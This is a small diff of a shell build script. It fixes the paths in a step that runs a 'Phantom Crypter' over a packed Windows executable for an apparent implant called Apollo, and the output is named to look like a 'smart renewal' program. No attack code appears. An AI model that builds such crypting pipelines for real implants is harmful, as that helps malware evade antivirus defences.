@@ -69,10 +69,10 @@ fi
 
 # Step 4: Apply Python crypter
 echo "[+] Step 4: Applying Phantom Crypter..."
-if [ -f "../phantom_crypter.py" ]; then
-    cd ..
-    python3 phantom_crypter.py temp/build/Apollo_packed.exe
-    cd agent_code
+if [ -f "../../phantom_crypter.py" ]; then
+    cd ../..
+    python3 phantom_crypter.py apollo/temp/build/Apollo_packed.exe
+    cd apollo/agent_code
     
     # Copy final output
     if [ -f "../phantom_output/phantom_smart_renewal_"*.exe ]; then
